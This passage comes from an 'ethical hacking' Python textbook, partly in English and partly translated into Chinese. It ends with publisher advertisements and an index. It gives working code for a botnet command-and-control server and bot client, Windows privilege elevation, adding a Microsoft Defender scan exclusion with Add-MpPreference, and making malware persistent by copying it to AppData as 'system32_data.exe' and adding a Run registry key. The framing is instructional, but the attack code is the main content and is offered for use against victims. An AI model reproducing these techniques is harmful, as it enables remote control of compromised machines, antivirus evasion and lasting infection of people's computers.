+  \ if len(clients) != 0:\n            for i, c in enumerate(clients):\n         \
+  \       print(\"\\t\\t\", i, \"\\t\", c.getpeername())\n\n                selected_client\
+  \ = int(input(\"[+] Select client by index: \"))\n                bot = clients[selected_client]\n\
+  \                run_bot = True\n                while run_bot:\n              \
+  \      msg = input(\"[+] Enter Msg: \")\n                    msg = msg.encode()\n\
+  \                    bot.send(msg)\n                    if msg.decode() == \"exit\"\
+  :\n                        run_bot = False\n                status = bot.recv(1024)\n\
+  \                if status == \"disconnected\".encode():\n                    bot.close()\n\
+  \                    clients.remove(bot)\n\n\n                print(\"data sent\"\
+  )\n        else:\n            print(\"[+] No clients connected\")\n        ans =\
+  \ input(\"[+] Do you want to exit? press [y/n] \")\n        if ans == \"y\":\n \
+  \           run_cnc = False\n```\n\n```\nelse:\n    run_cnc = True\n```\n\nNow we\
+  \ have defined a basic structure for the command-and-control center. The complete\
+  \ code for the bot can be found at the following link:\n\n```\nhttps://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example13-CNC/CnC.py\n\
+  ```\n\nNext, we will define the logic for our bot.\n\nGo to the victim computer\
+  \ and create a new file called bot1.py. We will create a socket object and try to\
+  \ communicate with the hacker using the hacker's IP. This step is similar to the\
+  \ malware program we developed earlier:\n\n```\nimport socket\n\n\nif __name__ ==\
+  \ \"__main__\":\n    print(\"[+] Connecting with server\")\n    s = socket.socket(socket.AF_INET,\
+  \ socket.SOCK_STREAM)\n    s.connect((\"192.168.0.11\", 8085))\n```\n\nNext, we\
+  \ will create a loop for run_bot and try to receive messages that the CNC is sending\
+  \ and once the message is received, you can define your own logic here. Here we\
+  \ will simply print the message, but you can add functionality to your liking. Once\
+  \ the CNC sends an exit message, we can simply disconnect the client bot from the\
+  \ server. The code is listed as follows:\n\n```\nrun_bot = True\n    while run_bot:\n\
+  \        communicate_bot = True\n        while communicate_bot:\n            msg\
+  \ = s.recv(1024)\n            msg = msg.decode()\n            print(\"command center\
+  \ said: \", msg)\n            if msg == \"exit\":\n                communicate_bot\
+  \ = False\n        # ans = input(\"[+] do you want to remain connected: \")\n  \
+  \      ans = \"connected\"\n        if ans == \"no\":\n```\n\n```\nstatus = \"disconnected\"\
+  \ns.send(status.encode())\nrun_bot = False\nelse:\n    status = \"connected\".encode()\n\
+  s.send(status)\ns.close()\n```\n\nThe complete code for bot1.py is given at the\
+  \ following link:\n\n```\nhttps://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example13-CNC/bot1.py\n\
+  ```\n\nIn this section, we have learned how to create a command-and-control center\
+  \ for bot net clients. You can add any number of clients you want and control them\
+  \ all together with your CNC program.\n\n## Summary\n\nIn this chapter, we learned\
+  \ about some methods for how to successfully deploy your malware programs. An important\
+  \ aspect of a malware program is how stealthy it is. This chapter focused on hiding\
+  \ your malware inside images. We learned about malware attacks over a public IP\
+  \ and how a hacker can attack victims that are not present in the same network as\
+  \ the victim. We then learned how to crack a password-protected file using a dictionary\
+  \ attack. Lastly, we learned how to create a command-and-control center for botnet-based\
+  \ attacks. These attacks allow the hacker to control a large number of distributed\
+  \ devices with only one program. After going through this chapter, you should be\
+  \ able to create trojans, perform attacks over a public IP, and create your own\
+  \ botnets. In the next chapter, we will learn how you can protect your online identity\
+  \ as a hacker and how important this aspect is to a successful attack. See you in\
+  \ the next chapter!\n"
+- "# 9 System Protection and Perseverance\n\nIn this chapter, we are going to focus\
+  \ our attention on how defense mechanisms work and by understanding how they work,\
+  \ you can learn what techniques you can use to bypass them. We will start by learning\
+  \ about intrusion detection systems and their different types. After that, we will\
+  \ learn about detection mechanisms. Once we understand these mechanisms, we will\
+  \ try to bypass them using our tools. In summary, this chapter will focus on the\
+  \ following topics:\n\n- System protection\n- Intrusion detection methods\n- Detection\
+  \ mechanisms\n- Bypassing IDSes\n\n## Persistence system protection\n\nOur previous\
+  \ chapters focused on creating malware and carrying out different attacks. This\
+  \ is the offensive side of attacks. However, in real-life hacking, you need to know\
+  \ how to protect yourself against external attacks. A better understanding of protection\
+  \ mechanisms would help you to not only protect yourself, but this knowledge would\
+  \ also help you to carry out successful attacks. The first line of defense against\
+  \ external network attacks, or system attacks in general, is the **Intrusion Detection\
+  \ System (IDS)**. IDS is an umbrella term for a lot of tools used for system security\
+  \ and protection, so we must learn about them in detail.\n\n## Intrusion detection\
+  \ systems\n\nIDSes are a system that monitor and detect the components of your network\
+  \ or system on a continuous basis to detect any undesirable or suspicious behavior.\
+  \ The goal of an IDS is to prevent any undesirable scenario in a system. Fundamentally,\
+  \ there are three types of IDS:\n\n- Host-based IDSes\n- Network-based IDSes\n-\
+  \ Hybrid IDSes\n\nLet's discuss these in detail in the following sections.\n\n##\
+  \ Host-based IDSes\n\nHost-based IDSes run on the system they are monitoring. Along\
+  \ with other software, host-based IDSes monitor the filesystem to scan for any potentially\
+  \ harmful files. They also monitor and analyze network traffic to see whether any\
+  \ malicious traffic is occurring over the network.\n\nHost-based IDSes are an important\
+  \ part of a system's security apparatus; however, they often do not give complete\
+  \ details regarding the security state of the system. They can be modified and even\
+  \ bypassed by different attacks. An important aspect of a host-based IDS is how\
+  \ up to date it is in terms of modern threat detection. It should constantly keep\
+  \ up with the modern threats and block them immediately if it detects them. An important\
+  \ feature of a host-based IDS is to keep a log of all critical activities occurring\
+  \ on a system. This can help a lot in threat detection and incidence response.\n\
+  \nOn most common OSes, you have some sort of host-based IDS already built in. In\
+  \ a Windows OS, Windows built-in antivirus is part of the host IDS. It monitors\
+  \ and detects any suspicious activity on the system and blocks potential threats\
+  \ from acting on a system. Along with virus detection, it also works to detect any\
+  \ tampering of critical Windows infrastructure.\n\n## Network-based IDSes\n\nAnother\
+  \ important aspect of system security is network-based protection. Network-based\
+  \ IDSes play a key role in limiting external network attacks from taking place.\
+  \ They play a role in protecting all devices present in a network. It observes network\
+  \ traffic over the whole subnet to monitor suspicious activity. It can be combined\
+  \ with firewalls to provide additional security. Sometimes, network-wide firewalls\
+  \ are part of an IDS.\n\n## Hybrid IDSes\n\nAs the name suggests, these detection\
+  \ systems provide much more security for the system as compared with individual\
+  \ systems. They combined both system-based and network-based approaches to catch\
+  \ malicious behavior and have a much higher rate of detection. Modern hybrid IDSes\
+  \ use both conventional and artificial intelligence (AI)-based techniques to prevent\
+  \ network attacks.\n\nNow that we have learned about different types of IDS, let’s\
+  \ see how these IDSes work.\n\n## IDS detection mechanisms\n\nMost common IDSes\
+  \ work by using the following two fundamental techniques, although modern IDSes\
+  \ use much more sophisticated approaches. Let’s take a look at different detection\
+  \ mechanisms and how they are used in real systems.\n\n\n\n\n\n## 基于签名的检测\n\n这是一种经典的知识型方法，自计算机安全早期以来就一直在使用。在这种方法中，防护软件可以访问一个庞大的已知恶意软件数据库。利用该数据库，它可以看到恶意软件中存在哪些字节，然后只需将系统引入的任何新文件与该字节序列进行比较。如果未知文件的字节序列与数据库中存在的字节序列匹配，这意味着该未知文件很可能具有恶意性，并且它会立即阻止该文件。否则，它将继续正常操作。该算法在其最简单的形式下如下所示：\n\
+  \n![](img/d31345bbfd15f63be2920f0de5fa30dc_194_0.png)\n\n图 9.1 – 基于签名的检测机制\n\n基于签名的检测对于已知恶意软件效果很好，因此一个好的\
+  \ IDS 必须拥有更大的恶意软件数据库。这种方法的好坏完全取决于其用于测试的数据库。尚未被检测到的新编写的恶意软件将对该测试产生假阴性。\n\n## 基于异常的检测\n\
+  \n这些检测系统的工作方式与基于签名的方法不同。它们监控程序所进行的活动。它定义了某些被视为 *正常行为* 的场景，然后寻找这些行为中的任何异常。例如，游戏软件不应尝试禁用防病毒系统。一旦恶意程序试图做一些它不应该做的事情，这些系统就会将这些程序标记为可疑，并在它们检测到程序试图执行绝对不应该执行的操作之前持续监控它们。一旦检测到可疑行为，它要么完全阻止该程序，要么为管理员生成\
+  \ *红色警报*。\n\n请注意，IDSes 和 **入侵防御系统 (IPSes)** 之间存在细微差别。出于实际目的，大多数情况下，这些任务由同一软件执行，我们在实践中不会对它们进行区分。然而，有时你会看到\
+  \ IDS 和 IPS 被分别提及，因此你应该知道它们之间的区别。\n\n现在我们已经了解了 IDS 是什么以及它是如何工作的，我们可以开始构建一个程序来学习如何绕过这些系统。\n\
+  \n## 绕过 IDS\n\n在 *第 6 章，恶意软件开发* 和 *第 7 章，高级恶意软件* 中，我们开发了我们的恶意软件程序，而在 *第 8 章，后渗透*\
+  \ 中，我们学习了如何将我们的恶意软件打包成特洛伊木马。我们的恶意软件运行良好，如果 IDS 使用基于签名的方法，它很可能不会被检测到，因为恶意软件是由你编写的，而你的程序在任何地方都没有签名。然而，现代\
+  \ IDS 非常聪明，经过几次运行后，它们会开始注意到可疑行为，并为此使用非常详尽的方法。在本节中，我们将尝试了解如何运行我们的 Python 可执行文件并获得管理员权限。这将有助于在受害者机器上完成某些任务，而\
+  \ *普通* 可执行文件无法完成。例如，在 Windows 上禁用防病毒程序，或为某个文件夹创建例外以使病毒扫描程序不扫描它，都需要在 Windows 上具有管理员权限。你无法使用普通可执行文件执行此类活动。\n\
+  \n让我们先看看如何以 *管理员权限* 运行可执行文件。你可以将此方法与你的恶意软件程序结合使用。然而，为了简单起见，我将使用一个简单的 Python 脚本来演示此过程。\n\
+  \n让我们创建一个新的 Python 脚本。同样创建一个新的虚拟环境。提升 Python 程序权限的方法有很多，你会在网上找到多个解决方案。然而，我发现的最简单的解决方案是使用一个名为\
+  \ elevate 的库。由于我们将为演示目的创建可执行文件，让我们也安装 pyinstaller。\n\n一旦你在虚拟环境中创建了新项目并安装了 pyinstaller，让我们运行以下行来下载\
+  \ elevate Python 模块：\n\n```\npip install elevate\n```\n\n一旦安装了此包，你就可以在代码中使用它来提高可执行文件的权限。根据我的经验，我发现将此功能放在脚本开头是个好主意，以获得最佳效果。要提升脚本的权限，你只需调用此模块中的\
+  \ elevate 函数即可。\n\n让我们先看看在我们使用此模块之前用户权限级别是什么。只需编写以下代码进行测试。我们可以使用 os 模块来检查 root 权限：\n\
+  \n```\nimport ctypes\nimport platform\ndef is_root():\n    if platform.system()\
+  \ == \"Windows\":\n        return ctypes.windll.shell32.IsUserAnAdmin()\n    else:\n\
+  \        return 1\n\nprint(is_root())\n```\n\n你可以使用上述代码来查看程序是否以提升模式运行。如果前一段代码返回的值为\
+  \ 1，这意味着它以管理员身份运行，否则它以非管理员模式运行。让我们运行之前的程序来查看执行模式：\n\n```\n(venv) C:\\Users\\fahad-sarwar\\\
+  Desktop\\example13-privilege-escalation>python priv.py\n0\n```\n\n图 9.2 – 无管理员权限\n\
+  \n按下 **Yes** 后，你将看到以下屏幕，表明已创建一个新进程并以更高的权限运行，用 1 表示：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_198_0.png)\n\
+  \n图 9.4 – 管理员权限\n\n现在我们已经学会如何以管理员身份运行脚本，让我们看看如何修改 Windows 设置以将例外添加到 IDS 扫描中。我们将向\
+  \ Windows 例外规则添加一个目录。这将允许我们跳过对某个目录的病毒扫描，并帮助我们在该目录中植入恶意软件。\n\n提升权限的完整代码位于以下链接：https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example14-priv-escalation/escalation.py。\n\
+  \n在之前的程序中，我们首先提升权限，然后在 Windows Defender 设置中为我们恶意软件所在的文件夹添加一个例外。这将跳过对当前文件夹的扫描。以下代码实现了此目的：objective.d:\n\
+  \n```\ncommand = \"Add-MpPreference -ExclusionPath \" + dir_to_add\nall_commands.append(command)\n\
+  ```\n\n上一行将例外添加到 Microsoft Defender 扫描存储库中，如以下屏幕截图所示：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_198_1.png)\n\
+  \n图 9.5 – 为病毒扫描添加了排除项\n\n现在我们知道如何让我们的程序以隐身模式运行并避免被 IDS 检测到。接下来，我们将为我们的程序添加持久性。这将允许我们的程序在\
+  \ Windows 启动时运行，这样用户就不必每次都点击恶意软件程序以便我们建立反向连接。受害者只需点击一次恶意软件，我们就会为启动程序添加一个 Windows\
+  \ 注册表项，这样每次计算机启动时，我们的恶意软件程序都会运行。你可以将此方法用于我们在第 6 章《恶意软件开发》和第 7 章《高级恶意软件》中开发的受害者程序。这里，为了简单起见，我将只使用一个演示脚本。\n\
+  \n## 持久性\n\n在本节中，我们将学习如何在 Windows 启动时运行我们的 Python 脚本。让我们创建一个新项目。你也可以修改我们在第 6 章《恶意软件开发》和第\
+  \ 7 章《高级恶意软件》中开发的受害者程序。为了为我们的程序添加持久性，我们需要确切知道我们正在运行的可执行文件的名称。一旦我们知道可执行文件，我们就可以在其他地方复制此可执行文件，并在系统每次启动时从那里运行它。这听起来很复杂，所以让我们一步一步来看。首先，我们需要知道可执行文件的名称。为了找出这一点，让我们编写以下代码：\n\
+  \n```\nimport sys\ncurr_executable = sys.executable\nprint(\"Current executable\
+  \ : \", curr_executable)\n```\n\n如果将上述程序作为 Python 脚本运行，其输出如下：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_199_0.png)\n\
+  \n图 9.6 – 当前解释器名称\n\n这只告诉我们 Python 解释器的名称，而不是我们需要的可执行文件的名称。为什么会这样？因为我们目前只是在运行一个脚本。获取实际可执行文件名称的唯一方法是在我们将文件作为二进制可执行文件运行时使用\
+  \ pyinstaller。创建一个二进制可执行文件并通过双击运行它。看一下以下屏幕截图：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_199_1.png)\n\
+  \n图 9.7 – 实际可执行文件名称\n\n\n\n\n\n你可以看到现在我们已经获取到了所需的实际可执行文件名。下一步是复制这个可执行文件并将其存储在其他位置，使其对受害者隐藏，最后将其添加到启动应用程序的注册表中。\n\
+  \n我们将把这个可执行文件复制到 Windows 上的 AppData 文件夹中，这是一个包含应用程序数据的特殊文件夹。要获取 AppData 文件夹的路径，可以编写以下代码：\n\
+  \n```\napp_data = os.getenv(\"APPDATA\")\n```\n\n让我们重命名可执行文件，使其看起来不那么可疑。我们将把这个可执行文件命名为\
+  \ system32_data.exe。这是一个虚构的名称，你可以使用任何你想要的名称：\n\n```\nto_save_file = app_data + \"\
+  \\\\\" + \"system32_data.exe\"\n```\n\n接下来，将当前可执行文件复制到 AppData 并重命名。我们需要从 Python\
+  \ 标准库中导入 shutil 模块：\n\n```\nshutil.copyfile(curr_executable, to_save_file)\n```\n\
+  \n要在启动时将其添加到 Windows 注册表中，你需要运行以下代码：\n\n```\nkey = winreg.HKEY_CURRENT_USER\n##\
+  \ \"Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\nkey_value = \"Software\\\
+  \\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\"\nkey_obj = winreg.OpenKey(key,\
+  \ key_value, 0, winreg.KEY_ALL_ACCESS)\nwinreg.SetValueEx(key_obj, \"systemfilex64\"\
+  , 0, winreg.REG_SZ, to_save_file)\nwinreg.CloseKey(key_obj)\n```\n\n这段代码只是将包含可执行文件名的\
+  \ to_save_file 字符串添加到启动注册表中。\n\n要对程序进行更改，你需要以管理员模式运行此可执行文件，因此你可以复制上一节中的代码并将其添加到此脚本的开头。完整代码如下：\n\
+  \n```\nif not os.path.exists(to_save_file):\n    print(\"Becoming Persistent\")\n\
+  \    shutil.copyfile(curr_executable, to_save_file)\n    key = winreg.HKEY_CURRENT_USER\n\
+  \    # \"Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\n    key_value = \"\
+  Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\"\n    key_obj = winreg.OpenKey(key,\
+  \ key_value, 0, winreg.KEY_ALL_ACCESS)\n    winreg.SetValueEx(key_obj, \"systemfilex64\"\
+  , 0, winreg.REG_SZ, to_save_file)\n    winreg.CloseKey(key_obj)\nelse:\n    print(\"\
+  path doesn't exist\")\n```\n\n运行代码后，如果你进入 AppData 文件夹，你将看到以下可执行文件：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_201_0.png)\n\
+  \n图 9.8 – 当前可执行文件已复制到 AppData 文件夹\n\n此外，要验证 Windows 注册表是否已被修改，通过在 Windows 搜索中搜索\
+  \ regedit 打开注册表编辑器。打开它并转到以下路径：\n\n```\nHKEY_CURRENT_USER\\Software\\Microsoft\\\
+  Windows\\CurrentVersion\\Run\n```\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_201_1.png)\n\
+  \n图 9.9 – 已编辑的注册表\n\n最后一行是我们刚刚添加的条目。你可以看到前一张截图中 **Data** 字段链接到我们刚刚复制的可执行文件。现在，如果你重启电脑，你会看到系统启动后，上述可执行文件将自动启动。作为练习，尝试使用受害者恶意程序复制相同的操作。当受害者启动其计算机时，你应该能够从受害者机器上获得返回连接。\n\
+  \n## Summary\n\n在本章中，我们学习了不同的系统保护技术。我们首先了解了系统保护以及不同 IDS/IPS 的工作原理。我们学习了不同类型的检测机制。我们还学习了使用具有提升权限的可执行文件。最后，我们学习了如何使我们的可执行文件保持持久性。结合你在前几章中学到的知识，这将使你能够在不被轻易检测到的情况下开发你的恶意工具。只要你保持恶意软件对系统的影响较低，IDS\
+  \ 就很难检测到你的恶意软件。我希望你学到了很多并喜欢这本书！请记住网络安全是一个不断变化的领域，你需要不断跟上现代工具，才能成为一名成功的渗透测试员。\n\n\
+  ![](img/d31345bbfd15f63be2920f0de5fa30dc_203_0.png)\n\nPackt.com\n\n订阅我们的在线数字图书馆，全面访问超过\
+  \ 7,000 本书籍和视频，以及帮助你规划个人发展和推进职业生涯的行业领先工具。有关更多信息，请访问我们的网站。\n\n## Why subscribe?\n\
+  \n- 使用来自 4,000 多名行业专业人士的实用电子书和视频，花更少的时间学习，花更多的时间编码\n- 使用专为你打造的技能计划提高学习效果\n- 每月获得一本免费电子书或视频\n\
+  - 完全可搜索，便于访问重要信息\n- 复制、粘贴、打印和书签内容\n\n你知道 Packt 为每本出版的书籍提供电子书版本，文件格式为 PDF 和 ePub\
+  \ 吗？你可以在 packt.com 升级到电子书版本，作为印刷书籍客户，你有权享受电子书的折扣。欲了解更多详情，请联系 customercare@packtpub.com。\n\
+  \n在 www.packt.com，你还可以阅读大量免费技术文章，订阅多种免费通讯，并获得 Packt 书籍和电子书的独家折扣和优惠。\n\n## Other\
+  \ Books You May Enjoy\n\n如果你喜欢这本书，你可能对 Packt 的其他书籍感兴趣：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_204_0.png)\n\
+  \n### Mastering Python for Networking and Security - Second Edition\n\nJosé Manuel\
+  \ Ortega\n\nISBN: 978-1-83921-716-6\n\n- 使用 Python 创建脚本以自动化安全和渗透测试任务\n- 探索网络安全流程中使用的\
+  \ Python 编程工具\n- 自动化分析服务器并从服务器提取信息的任务\n- 了解如何检测服务器漏洞并分析安全模块\n- 发现使用 Python 取证工具提取信息的方法\n\
+  - 专注于如何使用 Python 从 Tor 网络连接并获取信息\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_205_0.png)\n\
+  \n### Mastering Python Networking - Third Edition\n\nEric Chou\n\nISBN: 978-1-83921-467-7\n\
+  \n- 使用 Python 库与你的网络交互\n- 集成 Ansible 2.8 使用 Python 控制 Cisco、Juniper 和 Arista 网络设备\n\
+  - 利用现有的 Flask Web 框架构建高级 API\n- 学习如何在 AWS 和 Azure 云中构建虚拟网络\n- 学习如何使用 Elastic Stack\
+  \ 进行网络数据分析\n- 了解 Jenkins 如何用于自动部署网络中的更改\n- 使用 PyTest 和 Unittest 进行以测试为驱动的网络开发，在网络工程中使用\
+  \ Python\n\n## Packt is searching for authors like you\n\n如果你有兴趣成为 Packt 的作者，请访问\
+  \ authors.packtpub.com 并立即申请。我们已与成千上万的开发人员和技术专业人士合作，就像你一样，帮助他们与全球技术社区分享他们的见解。你可以提交通用申请、申请我们正在招募作者的特定热门主题，或提交你自己的想法。\n\
+  \n## Leave a review - let other readers know what you think\n\n请通过在你购买此书的网站上留下评论，与他人分享你对这本书的想法。如果你从\
+  \ Amazon 购买了此书，请在此书的 Amazon 页面上留下诚实的评论。这对其他潜在读者非常重要，他们可以使用你的公正意见来做出购买决定；我们也可以了解客户对我们产品的看法，我们的作者可以看到你对他们与\
+  \ Packt 合作的标题的反馈。这只需要你几分钟的时间，但对其他潜在客户、我们的作者和 Packt 来说都非常有价值。谢谢！\n"
+- "## Index\n\n### A\n\n- Access Point (AP) 53\n- active reconnaissance 20\n- active\
+  \ reconnaissance, information\n  - IP address 20\n  - MAC address 20\n  - operating\
+  \ system fingerprinting 20\n  - ports 20\n  - services/software running on target\
+  \ machine 20\n- Address Resolution Protocol (ARP)\n  - about 86\n  - need for 94\n\
+  \  - poisoning 94-97\n  - tables, restoring manually 106, 107\n- American Standard\
+  \ Code for Information Interchange (ASCII) 72\n- anomaly-based detection 182, 183\n\
+  - application header 74\n- Application Programming Interface (API) 120\n- ARP scanner\n\
+  \  - with Scapy 87-90\n- ARP spoof program\n  - building 98\n  - project, creating\
+  \ 99-104\n- artificial intelligence (AI) 181\n- asset 5\n- attack machine OS\n \
+  \ - Kali Linux 32\n- attacks, types\n  - about 27\n  - baiting 28\n  - phishing\
+  \ 28\n  - social engineering 27\n  - system control 27\n- availability principle\
+  \ 9\n\n### B\n\n- baiting 28\n- bettercap\n  - about 110\n  - reference link 110\n\
+  - binary logic levels 72\n- bit 72\n- black hat hackers 13\n- blocking function\
+  \ 121\n- botnets\n  - about 174\n  - creating 174-178\n\n\n\n\n\n## C\n\n首席信息安全官\
+  \ (CISO) 27\n通信\n  完整周期 58\n计算机网络 48, 49\n计算机网络，组件\n  关于 50\n  防火墙 52\n  网关 51\n\
+  \  集线器 51\n网络接口卡 (NIC) 50\n节点 50\n路由器 51\n服务器 50\n交换机 51\n传输介质 50\n机密性、完整性和可用性 (CIA\
+  \ 三元组) 6\n保密性原则 6, 7\n企业攻击 15\n企业黑客 15\n企业间谍 15\n网络安全，职业\n  关于 26\n首席信息安全官 (CISO)\
+  \ 27\n取证分析师 26\n渗透测试员 26\n安全架构师 26\n系统安全管理 26\n\n数字系统\n数据表示 72, 73\n目录\n  导航 137-139\n\
+  分布式拒绝服务 (DDoS) 23, 174\n域名服务器 (DNS) 64\n动态主机控制协议 (DHCP) 60, 96\n\n## D\n\n数据封装 73,\
+  \ 74\n拒绝服务 (DoS) 9\n\n## E\n\n以太网\n  关于 53\n  与 Wi-Fi 对比 54\n以太网头部 76, 77\n道德黑客\
+  \ 13\n道德黑客技术 5\n漏洞利用 5\n\n## F\n\n文件\n  上传到受害者 148\n防火墙 52\n取证分析师 26\n正向连接 118\n\
+  FTP 120\n\n## G\n\n网关 51\n好人 13\n灰帽黑客 13\n\n## H\n\n黑客程序，代码\n  参考链接 138\n黑客\n  关于\
+  \ 4, 5\n  目标 10\n  成为成功的黑客 10-12\n黑客服务器 124-126\n黑客，类型\n  关于 12\n  黑帽黑客 13\n  企业间谍\
+  \ 15\n  灰帽黑客 13\n  国家支持黑客 14\n  脚本小子 17\n  白帽黑客 12\n黑客攻击 5\n黑客攻击，阶段和方法\n  关于 18\n\
+  \  保持访问 23\n  攻击访问 22\n  获取访问 22\n  正向 shell 22\n  规划 19\n  攻击后利用 23\n  侦察 19\n\
+  \  反向 shell 22\n  掩盖痕迹 24\n  扫描 21\n  识别弱点 22\n黑客攻击阶段和方法，侦察方法\n  主动侦察 20\n  被动侦察\
+  \ 20\n黑客攻击阶段和方法，报告\n  关于 24\n发现部分 25\n引言部分 25\n方法部分 25\n摘要部分 25\n黑客行动主义者 16\n基于主机的入侵检测系统\
+  \ 180\nhttp 120\nHTTPS\n  绕过 109-114\n  与 HTTP 对比 107, 108\n集线器 51\n混合入侵检测系统 181\n\
+  \n## I\n\n入侵检测系统检测机制\n  关于 181\n  基于异常的检测 183\n  基于签名的检测 182\n集成开发\n  环境 38, 39\n\
+  完整性原则 8\n知识产权 (IP) 15\n互联网 55\n互联网服务提供商 (ISP) 60, 64\n入侵检测系统 (IDS)\n  关于 64, 148,\
+  \ 180\n  绕过 183-187\n  基于主机的入侵检测系统 180\n  混合入侵检测系统 181\n  基于网络的入侵检测系统 181\n入侵检测系统\n\
+  \  (IDSes) 21, 119\n入侵防御系统 (IPSes) 183\nIP 地址 60\nIP 头部 76\nIPv4\n  与 IPv6 对比 62\n\
+  \n## K\n\nKali\n  更新 40\nKali Linux\n  安装 32\n  Python 安装 37\n键盘记录器\n  构建 151-156\n\
+  键盘记录器文件传输\n  构建 141\n互联网 55\n局域网 (LAN) 53\n城域网 (MANs) 54\n个人区域网络 (PAN) 54\n广域网 (WAN)\
+  \ 55\n网络地址转换 (NAT) 60\n基于网络的入侵检测系统 181\n网络配置\n  设置 39, 40\n网络实体\n  关于 60\n  IPv4\
+  \ 62\n  IPv6 62\n  MAC 地址 62\n  端口 63\n  私有 IP 地址 60, 61\n网络\n  关于 48, 71\n  数据封装\
+  \ 73, 74\n  数据在数字系统中的表示 72, 73\n  数据包交付过程 74\n网络接口卡 (NIC) 50\n网络扫描器\n  使用 Scapy\
+  \ 86\n网络栈 55\n网络流量\n  解密 107\n  HTTPS，绕过 109-114\n  HTTPS，与 HTTP 对比 107, 108\n节点\
+  \ 50\n\n## L\n\n局域网 (LAN) 53\n\n## M\n\nMAC 地址\n  关于 62\n  修改 64-67\n恶意软件\n  关于\
+  \ 5\n  创建 124\n  黑客服务器 124-126\n  打包 157\n  受害者客户端 126-129\n中间人攻击 (MITM) 87, 97\n\
+  媒体访问控制 (MAC) 地址 61\nMetasploit 23\n城域网 (MANs) 54\n\n## N\n\n国家支持黑客 14\n网络\n  关于\
+  \ 49\n  分类 53\n\n## O\n\n开放系统互连 (OSI) 模型\n  关于 56\n  应用层 56\n数据链路层 57\n层映射 59\n\
+  网络层 57\n物理层 57\n表示层 56\n会话层 57\n传输层 57\nPython\n安装 36\n在 Kali Linux 上安装 37\n在 Windows\
+  \ 上安装 36, 37\n套接字编程 119\nPython 脚本\n创建 67-69\n\n## P\n\n数据包交付过程\n关于 74\n以太网头部 76,\
+  \ 77\nIP 头部 76\nTCP 头部 75\n被动侦察 20\n密码\n破解 170-172\n窃取 172-174\n有效载荷 119\n渗透测试员\
+  \ 26\n渗透测试 5\n渗透测试 5\n渗透测试\n关于 12\n合法性 12\n持久性 187-190\n持久性系统保护 180\n个人区域网络 (PAN)\
+  \ 54\n网络钓鱼 28\n端口 63\n私有 IP 地址 60, 61\n可编程逻辑控制器 (PLCs) 15\n保护 63, 64\n公网 IP 地址\n\
+  与私有 IP 地址对比 62\n公网 IP 攻击 169, 170\npyinstaller 库 158-162\n\n## R\n\n远程访问工具攻击 27\n\
+  远程访问工具 (RAT)\n关于 118\n正向连接 118\n反向连接 119\n反向 shell 119\n远程 shell 5\n反向连接 118, 119\n\
+  反向 shell 17\n路由器 49, 51\n\n## S\n\nScapy\n关于 77\n安装 77, 78\n参考链接 77\n用于 ARP 扫描 87-90\n\
+  用于网络扫描 86\n使用 78-85\n截图\n在受害者 PC 上截取 149-151\n脚本小子 17\n安全架构师 26\n段 57\n服务器 50\n\
+  shell 24\n嗅探 7\n社会工程学 27\nsocket.accept() API 121\nsocket.bind() API 121\nsocket.close()\
+  \ 122\nsocket.connect() 122\nsocket.listen() API 121\nsocket.recv() 122\n套接字\n关于\
+  \ 119, 120\n在 Python 中编程 119\n参考链接 119\nsocket.send() 122\nPython 中的套接字\n关于 123\n\
+  创建 120\nsocket.accept() API 121\nsocket.bind() API 121\nsocket.close() 122\nsocket.connect()\
+  \ 122\nsocket.listen() API 121\nsocket.recv() 122\nsocket.send() 122\nsocket.socket()\
+  \ API 120\nsocket.socket() API 120\n国家资助黑客 14\nStuxnet 病毒 15\n监控与数据采集系统 (SCADA)\
+  \ 15\n交换机 51\n系统控制 27\n系统安全管理 26\n\n## T\n\n目标 5\nTCP 头部 75\nTCP/IP 模型\n关于 58\n\
+  应用层 59\n互联网层 59\n层映射 59\n网络访问层 59\n传输层 59\ntelnet 120\n流量\n加密 105\n监控 105\n传输介质\
+  \ 50\n特洛伊木马\n关于 162\n创建 164-169\n添加可执行图标 163\n\n## V\n\n受害者文件\n下载到黑客 142-148\n受害者程序，代码\n\
+  参考链接 139\n受害者机器\n在上远程运行命令 129-137\n受害者机器操作系统 33-35\n虚拟环境\n使用 40-43\n虚拟操作系统\n攻击机操作系统\
+  \ 31\n安装 31\n受害者机器操作系统 33-35\nVirtualBox\n设置 30, 31\n下载链接 30\n虚拟专用网络 (VPNs) 64\n\
+  Visual Studio Code (VS Code)\n参考链接 38\n漏洞 5\n\n## W\n\n白帽黑客 12\n广域网 (WAN) 55\nWi-Fi\n\
+  关于 53\n与以太网对比 54\nWindows\nPython 安装 37\nWinrar 软件\n安装链接 164\n\n## Z\n\n零日漏洞利用 11\n\
+  \n"
